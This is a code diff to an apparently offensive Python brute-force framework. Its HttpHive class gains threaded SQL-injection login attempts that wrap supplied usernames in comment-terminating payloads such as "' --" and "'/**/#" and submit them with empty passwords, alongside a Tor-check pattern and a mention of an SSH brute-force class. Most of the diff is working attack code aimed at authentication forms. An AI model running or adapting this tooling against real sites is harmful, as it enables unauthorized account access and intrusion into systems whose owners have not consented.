@@ -330,7 +330,6 @@ class HttpHive(Hive):
         NAME_REGEX = re.compile(r'name\=\"(.*?)\"|name\=\'(.*?)\'') 
         VALUE_REGEX = re.compile(r'value\=\"(.*?)\"|value\=\'(.*?)\'')
         LOGIN_REGEX = re.compile(r'<input\stype\=\"password\"|<input\stype\=\'password\'')
-       # FIELD_REGEX = re.compile(r'(<input\stype\=.*?>)')
         FIELD_REGEX = re.compile(r'(<input\stype\=.*?>)|(<input\sname\=.*?>)')
 	CHECK_TOR_REGEX = re.compile(r'Congratulations\.\sThis\sbrowser\sis\sconfigured\sto\suse\sTor\.')
 	AUTHENTICATION_TYPE = re.compile(r'method\=\'(post)\'|method\=\"(post)\"|method\=\'(get)\'|method\=\"(get)\"')
@@ -357,12 +356,24 @@ class HttpHive(Hive):
 	def start(self,workers=1):
 		self.startTime = time.time()
 		if self.testSQLInjections == True:
+			threads = list()
 			self.SQLInjectionFile = 'sql-inject.json'
 			self.__loadLoginSQLInjection__()
-			for cred in self.SQLInjectionCredentialList:
-				result = self.attemptLogin(cred)
-				self.__displayMessage__(cred,result)
+			credlists = list()
+			if len(self.SQLInjectionCredentialList) > workers:
+				credlists = self.__splitList__(self.SQLInjectionCredentialList,workers)
+				for credList in credlists:
+					thread = Thread(target=self.__attemptSQLInjection__,args=(credList,))
+					threads.append(thread)
+				for worker in threads:
+					worker.start()
+				for worker in threads:
+					worker.join()	
+			
+			else:
+				self.__attemptSQLInjection__(self.SQLInjectionCredentialList)
 		Hive.start(self,workers)
+	
 
 	# function: __findForms__
 	# return: [str] 	- array of forms in html code
@@ -448,6 +459,7 @@ class HttpHive(Hive):
 			return True
 		else:
 			return False
+
 		
 	# function: checkSuccess
 	# param: response
@@ -549,13 +561,72 @@ class HttpHive(Hive):
 	# function: __loadSQLInjectionFields__
 	# description: Loads some SQL Injections specific for logins
 	def __loadLoginSQLInjection__(self):
+		cleanup_regex = re.compile(r'\s')
 		with open(self.SQLInjectionFile,'r') as sqlfile:
 			sqldata = json.load(sqlfile)
+		# Some basic None specific username logins
 		for groups in sqldata['logins']:
 			username = groups['username']
 			password = groups['password']
 			cred = Credential(username,password,self.target)
 			self.SQLInjectionCredentialList.append(cred)
+		# building injections based on supplied usernaem
+		if self.username:
+			self.SQLInjectionCredentialList += self.__buildSQLInjectionUsernames__(self.username)
+			self.SQLInjectionCredentialList = sorted(self.SQLInjectionCredentialList,reverse=True)
+		# building injections with supplied username-file
+		else:
+			for username in open(self.usernameFile, 'r').readlines():
+				username = cleanup_regex.subn('',username)[0]
+				username = username.split('\n')[0]	
+				self.SQLInjectionCredentialList += self.__buildSQLInjectionUsernames__(username)
+	
+	# function: __buildSQLInjectionUsernames__
+	# param: str		- username to build injections with
+	# return: [Credential]	- array of SQL Injection based Credentials 
+	# description: Builds a list of Credential objects that have SQL injections built around the username supplied
+	def __buildSQLInjectionUsernames__(self,username):
+		injections = ['%s\' --','%s\' #','%s\'/*','%s\'/**/--','%s\'/**/#']
+		new_creds = list()
+		for inject in injections:
+			user = inject%username
+			password = ''	
+			cred = Credential(user,password,self.target)
+			new_creds.append(cred)
+		return new_creds
+	
+	# function: __attemptSQLInjection__
+	# description: Threaded SQL injection login attempt
+	def __attemptSQLInjection__(self,credlist):
+		for credential in credlist:
+			result = self.attemptLogin(credential)
+			self.__displayMessage__(credential,result)
+			if self.isFinished == False:
+				self.isFinished = result
+			else:
+				exit()
+				break
+			if self.isFinished == True:
+				exit()
+				break
+
+	# function: __splitList__
+	# param: []		- array to split
+	# param: splitNum  	- how many arrays to create from the orginal
+	# return: [[]]		- 2 dimensional array
+	# description: Attempts to split the array into the specified number of arrays, will return one more if the split was not even.
+	def __splitList__(self,listToSplit,splitNum):
+		lists = list()
+		size = len(listToSplit)/splitNum
+		endIndex = 0
+		for index in range(splitNum):
+			startIndex = index*size
+			endIndex = startIndex+size	
+			lists.append(listToSplit[startIndex:endIndex])
+		if endIndex%len(listToSplit) != 0:
+			lists.append(listToSplit[endIndex:])
+		return lists
+	
 
 # class: SSHHive
 # description: Hive used to brute-force ssh logins
